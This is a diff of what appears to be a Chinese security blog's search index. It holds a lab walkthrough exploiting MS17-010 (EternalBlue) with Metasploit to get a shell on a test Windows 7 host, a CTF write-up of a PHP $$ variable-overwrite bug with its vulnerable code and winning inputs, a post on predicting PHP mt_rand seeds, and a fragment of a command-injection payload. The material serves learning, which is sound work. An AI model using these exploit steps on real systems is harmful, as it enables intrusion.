@@ -81,6 +81,63 @@
       </categories>
   </entry>
   <entry>
+    <title>MSF利用MS17_010渗透内网主机</title>
+    <url>/2020/12/23/MSF%E4%B9%8B%E5%88%A9%E7%94%A8MS17_010%E6%B8%97%E9%80%8F%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA/</url>
+    <content><![CDATA[<p>记一次MSF利用MS17_010渗透内网主机</p>
+<a id="more"></a>
+<h2 id="测试环境"><a class="header-anchor" href="#测试环境">¶</a>测试环境:</h2>
+<p>攻击主机:kali-linux-2020</p>
+<p>目标主机:win7主机(测试时关闭了防火墙)</p>
+<pre><code>ip:192.168.94.130
+</code></pre>
+<h2 id="信息搜集"><a class="header-anchor" href="#信息搜集">¶</a>信息搜集</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sT -T4 -A 192.168.94.130</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/6b7cd743bf1a63607582b35cf02c8d95.png" alt="Snipaste_2020-12-23_16-40-44.png"></p>
+<p>可以看见开放了 445端口的smb共享文件操作</p>
+<p>所以我们能利用永恒之蓝漏洞进行渗透</p>
+<h2 id="msf的使用"><a class="header-anchor" href="#msf的使用">¶</a>msf的使用</h2>
+<p>开启msf,初次使用需要 <code>msfdb init</code> 初始化一下msf的数据库(msf的数据库是postgresql)</p>
+<p>后面就可以直接使用 msfdb start启动它的数据库了</p>
+<p>启动msf</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+<p>可以看到启动成功</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/48d56f67680718424465ea602dd0b4bc.png" alt="Snipaste_2020-12-23_16-44-28.png"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">search ms17_010</span><br></pre></td></tr></table></figure>
+<p>看一看利用的模块</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/078b80f52bdc70d8443115a7547956c0.png" alt="Snipaste_2020-12-23_16-45-43.png"></p>
+<p>可以先使用辅助模块 auxliar 进行辅助看看是否存在这个漏洞利用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010   </span><br></pre></td></tr></table></figure>
+<p><code>options</code>看一下我们需要设置什么payload</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/827f318393361849c45c568110a357ee.png" alt="Snipaste_2020-12-23_16-49-18.png"></p>
+<p>可以看到我们需要设置攻击的ip</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set rhosts 192.168.94.130</span><br></pre></td></tr></table></figure>
+<p>然后 <code>run</code>  或者 <code>exploit</code></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/db8072a9eefb03c5da1b3e70b645bb84.png" alt="Snipaste_2020-12-23_16-50-25.png"></p>
+<p>可以看到 可能存在ms17_010漏洞</p>
+<p>接下来我们使用 exploit模块进行 漏洞利用getshell</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue </span><br></pre></td></tr></table></figure>
+<p>然后 <code>set payload</code> 可以看到我们只需要设置 rhosts就行了</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/813e501f2dd4a2075a3fb7faa6383bc5.png" alt="Snipaste_2020-12-23_16-57-27.png"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set rhosts 192.168.94.130</span><br></pre></td></tr></table></figure>
+<p>然后run</p>
+<p>可以看到成功了 进行的是meterpreter了</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/91b6d69faf090b7300ab9176cf8f7dcb.png" alt="Snipaste_2020-12-23_17-01-44.png"></p>
+<p>输入shell 可以看到我们成功进入了目标机的cmd了</p>
+<p>ipconfig可以看到一些信息</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/0da1dd8e0e5dce75d300652f86564312.png" alt="Snipaste_2020-12-23_17-05-03.png"></p>
+<p><strong>tip:</strong></p>
+<p>cmd中文乱码可以使用 <code>chcp 65001</code> 修改编码 部分中文能成功显示</p>
+<p>在meterpreter可以使用 background放入后台进程</p>
+<p>sessions 命令可以看后台进程</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/52ffa7da36dd2bb68e6094f732b33df3.png" alt="Snipaste_2020-12-23_17-03-38.png"></p>
+<p><strong>其它后渗透参考</strong>  <a href="https://blog.csdn.net/p_utao/article/details/108381939">https://blog.csdn.net/p_utao/article/details/108381939</a></p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+        <category>msf利用</category>
+      </categories>
+  </entry>
+  <entry>
     <title>ctfshow入门文件包含部分</title>
     <url>/2020/12/20/%5Bctfshow%5Dweb%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
     <content><![CDATA[<p>ctfshow web入门 文件包含部分</p>
@@ -210,63 +267,6 @@
       <categories>
         <category>刷题站</category>
         <category>ctfshow</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>MSF利用MS17_010渗透内网主机</title>
-    <url>/2020/12/23/MSF%E4%B9%8B%E5%88%A9%E7%94%A8MS17_010%E6%B8%97%E9%80%8F%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA/</url>
-    <content><![CDATA[<p>记一次MSF利用MS17_010渗透内网主机</p>
-<a id="more"></a>
-<h2 id="测试环境"><a class="header-anchor" href="#测试环境">¶</a>测试环境:</h2>
-<p>攻击主机:kali-linux-2020</p>
-<p>目标主机:win7主机(测试时关闭了防火墙)</p>
-<pre><code>ip:192.168.94.130
-</code></pre>
-<h2 id="信息搜集"><a class="header-anchor" href="#信息搜集">¶</a>信息搜集</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sT -T4 -A 192.168.94.130</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/6b7cd743bf1a63607582b35cf02c8d95.png" alt="Snipaste_2020-12-23_16-40-44.png"></p>
-<p>可以看见开放了 445端口的smb共享文件操作</p>
-<p>所以我们能利用永恒之蓝漏洞进行渗透</p>
-<h2 id="msf的使用"><a class="header-anchor" href="#msf的使用">¶</a>msf的使用</h2>
-<p>开启msf,初次使用需要 <code>msfdb init</code> 初始化一下msf的数据库(msf的数据库是postgresql)</p>
-<p>后面就可以直接使用 msfdb start启动它的数据库了</p>
-<p>启动msf</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
-<p>可以看到启动成功</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/48d56f67680718424465ea602dd0b4bc.png" alt="Snipaste_2020-12-23_16-44-28.png"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">search ms17_010</span><br></pre></td></tr></table></figure>
-<p>看一看利用的模块</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/078b80f52bdc70d8443115a7547956c0.png" alt="Snipaste_2020-12-23_16-45-43.png"></p>
-<p>可以先使用辅助模块 auxliar 进行辅助看看是否存在这个漏洞利用</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010   </span><br></pre></td></tr></table></figure>
-<p><code>options</code>看一下我们需要设置什么payload</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/827f318393361849c45c568110a357ee.png" alt="Snipaste_2020-12-23_16-49-18.png"></p>
-<p>可以看到我们需要设置攻击的ip</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set rhosts 192.168.94.130</span><br></pre></td></tr></table></figure>
-<p>然后 <code>run</code>  或者 <code>exploit</code></p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/db8072a9eefb03c5da1b3e70b645bb84.png" alt="Snipaste_2020-12-23_16-50-25.png"></p>
-<p>可以看到 可能存在ms17_010漏洞</p>
-<p>接下来我们使用 exploit模块进行 漏洞利用getshell</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue </span><br></pre></td></tr></table></figure>
-<p>然后 <code>set payload</code> 可以看到我们只需要设置 rhosts就行了</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/813e501f2dd4a2075a3fb7faa6383bc5.png" alt="Snipaste_2020-12-23_16-57-27.png"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set rhosts 192.168.94.130</span><br></pre></td></tr></table></figure>
-<p>然后run</p>
-<p>可以看到成功了 进行的是meterpreter了</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/91b6d69faf090b7300ab9176cf8f7dcb.png" alt="Snipaste_2020-12-23_17-01-44.png"></p>
-<p>输入shell 可以看到我们成功进入了目标机的cmd了</p>
-<p>ipconfig可以看到一些信息</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/0da1dd8e0e5dce75d300652f86564312.png" alt="Snipaste_2020-12-23_17-05-03.png"></p>
-<p><strong>tip:</strong></p>
-<p>cmd中文乱码可以使用 <code>chcp 65001</code> 修改编码 部分中文能成功显示</p>
-<p>在meterpreter可以使用 background放入后台进程</p>
-<p>sessions 命令可以看后台进程</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/52ffa7da36dd2bb68e6094f732b33df3.png" alt="Snipaste_2020-12-23_17-03-38.png"></p>
-<p><strong>其它后渗透参考</strong>  <a href="https://blog.csdn.net/p_utao/article/details/108381939">https://blog.csdn.net/p_utao/article/details/108381939</a></p>
-]]></content>
-      <categories>
-        <category>渗透测试</category>
-        <category>msf利用</category>
       </categories>
   </entry>
   <entry>
@@ -718,52 +718,6 @@ payload: cat flag.php||</p>
       </categories>
   </entry>
   <entry>
-    <title>记一题php$$变量覆盖</title>
-    <url>/2021/01/09/php$$%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/</url>
-    <content><![CDATA[<p>彻底学一下$$变量覆盖</p>
-<a id="more"></a>
-<h1>题目</h1>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">$_403 &#x3D; &quot;Access Denied&quot;;</span><br><span class="line">$_200 &#x3D; &quot;Welcome Admin&quot;;</span><br><span class="line">if ($_SERVER[&quot;REQUEST_METHOD&quot;] !&#x3D; &quot;POST&quot;)</span><br><span class="line">    die(&quot;BugsBunnyCTF is here :p...&quot;);</span><br><span class="line">if ( !isset($_POST[&quot;flag&quot;]) )</span><br><span class="line">    die($_403);</span><br><span class="line">foreach ($_GET as $key &#x3D;&gt; $value)</span><br><span class="line">    $$key &#x3D; $$value;</span><br><span class="line">foreach ($_POST as $key &#x3D;&gt; $value)</span><br><span class="line">    $$key &#x3D; $value;</span><br><span class="line">if ( $_POST[&quot;flag&quot;] !&#x3D;&#x3D; $flag )</span><br><span class="line">    die($_403);</span><br><span class="line">echo &quot;This is your flag : &quot;. $flag . &quot;\n&quot;;</span><br><span class="line">die($_200);</span><br></pre></td></tr></table></figure>
-<h2 id="分析"><a class="header-anchor" href="#分析">¶</a>分析</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if ($_SERVER[&quot;REQUEST_METHOD&quot;] !&#x3D; &quot;POST&quot;)</span><br><span class="line">    die(&quot;BugsBunnyCTF is here :p...&quot;);</span><br></pre></td></tr></table></figure>
-<p>请求方式需为POST</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if ( !isset($_POST[&quot;flag&quot;]) )</span><br><span class="line">    die($_403);</span><br></pre></td></tr></table></figure>
-<p>需要POST一个名为flag的变量</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foreach ($_GET as $key &#x3D;&gt; $value)</span><br><span class="line">    $$key &#x3D; $$value;</span><br><span class="line">foreach ($_POST as $key &#x3D;&gt; $value)</span><br><span class="line">    $$key &#x3D; $value;</span><br></pre></td></tr></table></figure>
-<p>$$，变量覆盖<br>
-第一个foreach处，能将任意变量的值赋予任意变量<br>
-第二个foreach处，能将输入的值赋予任意变量</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if ( $_POST[&quot;flag&quot;] !&#x3D;&#x3D; $flag )</span><br><span class="line">    die($_403);</span><br><span class="line">echo &quot;This is your flag : &quot;. $flag . &quot;\n&quot;;</span><br><span class="line">die($_200);</span><br><span class="line">$_POST[&quot;flag&quot;]如果与$flag不完全相等，即值和类型都比较时，输出$_403</span><br><span class="line">如果完全相等，则输出$flag和$_200</span><br></pre></td></tr></table></figure>
-<p>显然flag不是这个1<br>
-看回上面的变量覆盖，<code>foreach ($_POST as $key =&gt; $value)$$key = $value;</code><br>
-当只POST一个值为1的变量flag，<code>$$key = $valu</code>=&gt;<code>$flag = 1</code>，使可能原本存在的变量$flag被赋值为1，即真实的flag被修改为变量flag的值，由于前面的两个if，这是无法被改变的<br>
-所以，需要在真实的flag被修改前将其值给其他变量并能输出出来<br>
-能输出的只有<code>die($_403);</code>和<code>die($_200);</code>，所以思路是利用变量覆盖在flag被改前将真实的<code>$flag</code>的值覆盖<code>$_403</code>或<code>$_200</code>并输出<br>
-而能利用变量覆盖将一个变量的值覆盖其他变量的地方只有第一个foreach处</p>
-<h1>知识点</h1>
-<h2 id="变量覆盖"><a class="header-anchor" href="#变量覆盖">¶</a>$$变量覆盖</h2>
-<p><img src="https://img-blog.csdnimg.cn/20210114171227699.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h1>解法</h1>
-<h2 id="200"><a class="header-anchor" href="#200">¶</a>$_200</h2>
-<p>将真实的flag覆盖<code>$_200</code>并输出<code>$_200</code><br>
-<img src="https://img-blog.csdnimg.cn/20210114171253839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_GET[&#39;_200&#39;]&#x3D;&#39;flag&#39;;</span><br><span class="line">$_POST[&#39;flag&#39;]&#x3D;1;</span><br><span class="line">foreach ($_GET as $key &#x3D;&gt; $value)</span><br><span class="line">    $$key &#x3D; $$value;</span><br></pre></td></tr></table></figure>
-<p>相当于<code>$_200=$flag</code>，将真flag给了<code>$_200</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foreach ($_POST as $key &#x3D;&gt; $value)</span><br><span class="line">    $$key &#x3D; $value;</span><br><span class="line">if ( $_POST[&quot;flag&quot;] !&#x3D;&#x3D; $flag )</span><br><span class="line">    die($_403);</span><br><span class="line">$flag被修改为1，与$_POST[&#39;flag&#39;]等值等类型，不满足$_POST[&quot;flag&quot;] !&#x3D;&#x3D; $flag</span><br><span class="line">echo &quot;This is your flag : &quot;. $flag . &quot;\n&quot;;</span><br><span class="line">die($_200);</span><br></pre></td></tr></table></figure>
-<p>输出<code>$_200</code>即输出真flag</p>
-<h2 id="403"><a class="header-anchor" href="#403">¶</a>$_403</h2>
-<p>将真实的flag覆盖<code>$_403</code>并构造使<code>$_403</code>能输出<br>
-<img src="https://img-blog.csdnimg.cn/20210114171311729.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_GET[&#39;_403&#39;]&#x3D;flag&#96;&amp;&#96;$_GET[&quot;_POST[&#39;flag&#39;]&quot;]&#x3D;2&#96;</span><br><span class="line">&#96;$_POST[&#39;flag&#39;]&#x3D;1;</span><br><span class="line">foreach ($_GET as $key &#x3D;&gt; $value)</span><br><span class="line">    $$key &#x3D; $$value;</span><br></pre></td></tr></table></figure>
-<p>相当于<code>$_403=$flag</code>，将真flag给了<code>$_403</code>，以及<code>$_POST['flag']=$2</code>，<code>$2</code>不存在，即<code>$_POST['flag']</code>为空[实际代码应该会报错]</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$_POST</span>[<span class="string">&quot;flag&quot;</span>] !== <span class="variable">$flag</span> )</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$_403</span>);</span><br><span class="line"><span class="variable">$flag</span>被修改为<span class="number">1</span>，与<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]不等，满足<span class="variable">$_POST</span>[<span class="string">&quot;flag&quot;</span>] !== <span class="variable">$flag</span>，输出<span class="variable">$_403</span></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>web技术学习</category>
-        <category>常见黑魔法</category>
-      </categories>
-  </entry>
-  <entry>
     <title>msf的shell在windows中的利用</title>
     <url>/2020/12/20/msfvenom%E7%9A%84shell%E5%9C%A8windows%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
     <content><![CDATA[<p>msf的shell的制作</p>
@@ -845,6 +799,93 @@ payload: cat flag.php||</p>
       <categories>
         <category>web技术学习</category>
         <category>eval与assert</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>记一题php$$变量覆盖</title>
+    <url>/2021/01/09/php$$%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/</url>
+    <content><![CDATA[<p>彻底学一下$$变量覆盖</p>
+<a id="more"></a>
+<h1>题目</h1>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">$_403 &#x3D; &quot;Access Denied&quot;;</span><br><span class="line">$_200 &#x3D; &quot;Welcome Admin&quot;;</span><br><span class="line">if ($_SERVER[&quot;REQUEST_METHOD&quot;] !&#x3D; &quot;POST&quot;)</span><br><span class="line">    die(&quot;BugsBunnyCTF is here :p...&quot;);</span><br><span class="line">if ( !isset($_POST[&quot;flag&quot;]) )</span><br><span class="line">    die($_403);</span><br><span class="line">foreach ($_GET as $key &#x3D;&gt; $value)</span><br><span class="line">    $$key &#x3D; $$value;</span><br><span class="line">foreach ($_POST as $key &#x3D;&gt; $value)</span><br><span class="line">    $$key &#x3D; $value;</span><br><span class="line">if ( $_POST[&quot;flag&quot;] !&#x3D;&#x3D; $flag )</span><br><span class="line">    die($_403);</span><br><span class="line">echo &quot;This is your flag : &quot;. $flag . &quot;\n&quot;;</span><br><span class="line">die($_200);</span><br></pre></td></tr></table></figure>
+<h2 id="分析"><a class="header-anchor" href="#分析">¶</a>分析</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if ($_SERVER[&quot;REQUEST_METHOD&quot;] !&#x3D; &quot;POST&quot;)</span><br><span class="line">    die(&quot;BugsBunnyCTF is here :p...&quot;);</span><br></pre></td></tr></table></figure>
+<p>请求方式需为POST</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if ( !isset($_POST[&quot;flag&quot;]) )</span><br><span class="line">    die($_403);</span><br></pre></td></tr></table></figure>
+<p>需要POST一个名为flag的变量</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foreach ($_GET as $key &#x3D;&gt; $value)</span><br><span class="line">    $$key &#x3D; $$value;</span><br><span class="line">foreach ($_POST as $key &#x3D;&gt; $value)</span><br><span class="line">    $$key &#x3D; $value;</span><br></pre></td></tr></table></figure>
+<p>$$，变量覆盖<br>
+第一个foreach处，能将任意变量的值赋予任意变量<br>
+第二个foreach处，能将输入的值赋予任意变量</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if ( $_POST[&quot;flag&quot;] !&#x3D;&#x3D; $flag )</span><br><span class="line">    die($_403);</span><br><span class="line">echo &quot;This is your flag : &quot;. $flag . &quot;\n&quot;;</span><br><span class="line">die($_200);</span><br><span class="line">$_POST[&quot;flag&quot;]如果与$flag不完全相等，即值和类型都比较时，输出$_403</span><br><span class="line">如果完全相等，则输出$flag和$_200</span><br></pre></td></tr></table></figure>
+<p>显然flag不是这个1<br>
+看回上面的变量覆盖，<code>foreach ($_POST as $key =&gt; $value)$$key = $value;</code><br>
+当只POST一个值为1的变量flag，<code>$$key = $valu</code>=&gt;<code>$flag = 1</code>，使可能原本存在的变量$flag被赋值为1，即真实的flag被修改为变量flag的值，由于前面的两个if，这是无法被改变的<br>
+所以，需要在真实的flag被修改前将其值给其他变量并能输出出来<br>
+能输出的只有<code>die($_403);</code>和<code>die($_200);</code>，所以思路是利用变量覆盖在flag被改前将真实的<code>$flag</code>的值覆盖<code>$_403</code>或<code>$_200</code>并输出<br>
+而能利用变量覆盖将一个变量的值覆盖其他变量的地方只有第一个foreach处</p>
+<h1>知识点</h1>
+<h2 id="变量覆盖"><a class="header-anchor" href="#变量覆盖">¶</a>$$变量覆盖</h2>
+<p><img src="https://img-blog.csdnimg.cn/20210114171227699.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h1>解法</h1>
+<h2 id="200"><a class="header-anchor" href="#200">¶</a>$_200</h2>
+<p>将真实的flag覆盖<code>$_200</code>并输出<code>$_200</code><br>
+<img src="https://img-blog.csdnimg.cn/20210114171253839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_GET[&#39;_200&#39;]&#x3D;&#39;flag&#39;;</span><br><span class="line">$_POST[&#39;flag&#39;]&#x3D;1;</span><br><span class="line">foreach ($_GET as $key &#x3D;&gt; $value)</span><br><span class="line">    $$key &#x3D; $$value;</span><br></pre></td></tr></table></figure>
+<p>相当于<code>$_200=$flag</code>，将真flag给了<code>$_200</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foreach ($_POST as $key &#x3D;&gt; $value)</span><br><span class="line">    $$key &#x3D; $value;</span><br><span class="line">if ( $_POST[&quot;flag&quot;] !&#x3D;&#x3D; $flag )</span><br><span class="line">    die($_403);</span><br><span class="line">$flag被修改为1，与$_POST[&#39;flag&#39;]等值等类型，不满足$_POST[&quot;flag&quot;] !&#x3D;&#x3D; $flag</span><br><span class="line">echo &quot;This is your flag : &quot;. $flag . &quot;\n&quot;;</span><br><span class="line">die($_200);</span><br></pre></td></tr></table></figure>
+<p>输出<code>$_200</code>即输出真flag</p>
+<h2 id="403"><a class="header-anchor" href="#403">¶</a>$_403</h2>
+<p>将真实的flag覆盖<code>$_403</code>并构造使<code>$_403</code>能输出<br>
+<img src="https://img-blog.csdnimg.cn/20210114171311729.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_GET[&#39;_403&#39;]&#x3D;flag&#96;&amp;&#96;$_GET[&quot;_POST[&#39;flag&#39;]&quot;]&#x3D;2&#96;</span><br><span class="line">&#96;$_POST[&#39;flag&#39;]&#x3D;1;</span><br><span class="line">foreach ($_GET as $key &#x3D;&gt; $value)</span><br><span class="line">    $$key &#x3D; $$value;</span><br></pre></td></tr></table></figure>
+<p>相当于<code>$_403=$flag</code>，将真flag给了<code>$_403</code>，以及<code>$_POST['flag']=$2</code>，<code>$2</code>不存在，即<code>$_POST['flag']</code>为空[实际代码应该会报错]</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$_POST</span>[<span class="string">&quot;flag&quot;</span>] !== <span class="variable">$flag</span> )</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$_403</span>);</span><br><span class="line"><span class="variable">$flag</span>被修改为<span class="number">1</span>，与<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]不等，满足<span class="variable">$_POST</span>[<span class="string">&quot;flag&quot;</span>] !== <span class="variable">$flag</span>，输出<span class="variable">$_403</span></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>web技术学习</category>
+        <category>常见黑魔法</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>php伪随机数漏洞</title>
+    <url>/2020/10/10/php%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/</url>
+    <content><![CDATA[<p>针对ctf中伪随机数漏洞利用的小结</p>
+<a id="more"></a>
+<h2 id="相关函数"><a class="header-anchor" href="#相关函数">¶</a>相关函数</h2>
+<h3 id="mt-rand"><a class="header-anchor" href="#mt-rand">¶</a>mt_rand()</h3>
+<p>mt_rand函数有两个可选参数 min 和 max，如果没有提供可选参数，mt_rand函数将返回返回 0 到 mt_getrandmax() 之间的伪随机数。例如想要 5 到 15（包括 5 和 15）之间的随机数，用 mt_rand(5, 15)。</p>
+<h3 id="mt-srand"><a class="header-anchor" href="#mt-srand">¶</a>mt_srand()</h3>
+<p>用于播下一个更好的随机数发生器种子，用 <code>seed</code> 来给随机数发生器播种。 没有设定 <code>seed</code> 参数时，会被设为随时数。自 PHP 4.2.0 起，不再需要用 <a href="https://www.php.net/manual/zh/function.srand.php">srand()</a> 或 <strong>mt_srand()</strong> 给随机数发生器播种 ，因为现在是由系统自动完成的。</p>
+<p><strong>简单来说mt_scrand()通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数</strong></p>
+<p>这张图能帮助我们更好的了解php伪随机数</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/0bea9d50a588a31bb6a9e033987d6034.png" alt="img"></p>
+<h2 id="代码测试"><a class="header-anchor" href="#代码测试">¶</a>代码测试</h2>
+<p>我们输入种子12345 ，发现不管什么时候，回显的随机数都是一样的。其实，这就是伪随机数的漏洞，存在可预测性。</p>
+<p><img src="https://img-blog.csdnimg.cn/20201013155039595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20201013155049424.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p><strong>总的来说，我们知道种子后，可以确定你输出伪随机数的序列。 知道你的随机数序列，可以确定你的种子。</strong></p>
+<h2 id="根据随机数预测种子"><a class="header-anchor" href="#根据随机数预测种子">¶</a>根据随机数预测种子</h2>
+<p>以上面生成的随机数为例，假设我们知道了第一个生成的随机数，那我们怎么预测种子呢？<br>
+那就要用到<strong>php_mt_seed</strong>这个工具了。</p>
+<h3 id="php-mt-seed使用方法"><a class="header-anchor" href="#php-mt-seed使用方法">¶</a>php_mt_seed使用方法</h3>
+<p>kali下，进入目录，make</p>
+<p><img src="https://img-blog.csdnimg.cn/20201013155151119.png#pic_center" alt="在这里插入图片描述"></p>
+<p>./php_mt_seed 第一个随机数 ，（假设我们知道序列的第一个随机数是 1507887240）</p>
+<p>可以得到种子</p>
+<p><img src="https://img-blog.csdnimg.cn/20201013155210758.png#pic_center" alt="在这里插入图片描述"></p>
+<p>验证种子是否一样就是看 输出的序列是否一样</p>
+<p><img src="https://img-blog.csdnimg.cn/20201013155220900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>可以看到 1507887240 就是第一个随机数，可以确定我们原先的种子就是  1142896771</p>
+<h2 id="相关习题"><a class="header-anchor" href="#相关习题">¶</a>相关习题</h2>
+<p>平台：ctfshow    web入门  web25</p>
+<p>下面放出 此题的wp ：</p>
+<p><a href="https://blog.i0bin.cn/index.php/archives/50/">https://blog.i0bin.cn/index.php/archives/50/</a></p>
+<p>参考博客  ：<a href="https://www.cnblogs.com/zaqzzz/p/9997855.html">https://www.cnblogs.com/zaqzzz/p/9997855.html</a></p>
+]]></content>
+      <categories>
+        <category>web技术学习</category>
+        <category>php伪随机数漏洞</category>
       </categories>
   </entry>
   <entry>
@@ -954,152 +995,6 @@ payload: cat flag.php||</p>
       <categories>
         <category>web技术学习</category>
         <category>命令执行</category>
-      </categories>
